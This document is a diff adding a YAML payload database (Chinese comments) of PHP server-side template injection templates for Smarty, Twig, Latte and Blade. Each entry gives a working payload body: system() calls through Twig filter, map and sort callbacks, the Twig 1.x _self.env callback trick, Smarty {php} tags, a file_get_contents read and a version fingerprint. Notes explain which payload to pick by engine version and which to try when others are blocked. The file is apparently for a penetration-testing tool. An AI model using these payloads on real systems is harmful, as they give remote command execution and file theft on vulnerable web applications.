@@ -1,0 +1,153 @@
+ruleDB: v0.1.0
+# PHP 系：Smarty、Twig、Latte、Blade。
+
+templates:
+  - id: ssti.php.smarty.rce.system
+    name: Smarty system 命令执行
+    desc: Smarty 的 {php} 标签在新版被移除，用 {system()} 直接调
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [smarty]
+    version: "*"
+    body: "{system(\"<<cmd>>\")}"
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.php.smarty.file.read
+    name: Smarty 读文件
+    desc: Smarty 目标上只读文件时用它，比执行命令安静。模板里允许直接调 PHP 函数才成立——{php} 标签被移除后这是主要的一条路
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [smarty]
+    version: "*"
+    body: "{file_get_contents(\"<<filepath>>\")}"
+    vars: [filepath]
+    requires: [template-ctrl]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.php.twig.rce.filter
+    name: Twig 经 filter 过滤器命令执行
+    desc: Twig 里 system 不能直接当函数用，需要借 filter 回调
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [twig]
+    version: ">=1.0"
+    body: "{{['<<cmd>>']|filter('system')}}"
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.php.twig.rce.map
+    name: Twig 经 map 过滤器命令执行
+    desc: filter 被禁时的替代，map 的回调同样是任意函数名
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [twig]
+    version: ">=1.0"
+    body: "{{['<<cmd>>']|map('system')|join}}"
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.php.latte.rce.system
+    name: Latte system 命令执行
+    desc: Nette / Latte 项目里用。它和 Smarty 那条的载荷几乎一样，只能靠目标框架区分——先确定引擎再选，选错了不会执行
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [latte, nette]
+    version: "*"
+    body: "{system('<<cmd>>')}"
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.php.blade.php_tag
+    name: Blade @php 代码块
+    desc: Blade 的 {{ }} 会转义且不求值 PHP。@php 指令在部分版本可用，但 Laravel 5.5 起对用户输入基本不可达
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [blade, laravel]
+    version: "<5.5"
+    body: "@php system('<<cmd>>'); @endphp"
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.php.twig.rce.sort
+    name: Twig 经 sort 过滤器命令执行
+    desc: filter 和 map 都被禁时的第三条路，sort 的回调同样收任意函数名
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [twig]
+    version: ">=1.0"
+    body: "{{['<<cmd>>',0]|sort('system')|join}}"
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.php.smarty.detect
+    name: Smarty 版本指纹
+    desc: 先看版本再决定用哪条 RCE——3.1.32 之后 {system()} 之类的标签默认被禁
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [smarty]
+    version: "*"
+    body: "{$smarty.version}"
+    vars: []
+    requires: [template-ctrl]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.php.twig.rce.self_env
+    name: Twig 经 _self.env 命令执行
+    desc: filter / map / sort 那三条都被禁时的另一条路，**只对 Twig 1.x 成立**：那时 `_self` 还是模板对象本身，`_self.env` 就是 Twig_Environment，注册一个「找不到过滤器时回调 system」的钩子，再故意请求一个不存在的过滤器——参数就成了 system 的第一个参数。Twig 2.x 起 `_self` 变成模板**名字符串**，这条随之失效，所以 version 卡在 <2.0
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [twig]
+    version: "<2.0"
+    body: "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('<<cmd>>')}}"
+    vars: [cmd]
+    requires: [template-ctrl, weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.php.smarty.rce.php_tag
+    name: Smarty {php} 标签命令执行
+    desc: Smarty 3.1.32 **之前**默认允许 `{php}` 标签（`$php_handling` 默认是 SMARTY_PHP_ALLOW），标签体里写的是**原样的 PHP**——不要写 `<?php`，Smarty 自己会包一层。3.1.32 起这个标签被彻底移除，`{system()}` 那类变量修饰器也在同一批收紧里被禁，所以先拿 `ssti.php.smarty.detect` 看版本，2 或 3.1.3x 以前才有必要试这条
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [smarty]
+    version: "<3.1.32"
+    body: '{php}system("<<cmd>>");{/php}'
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
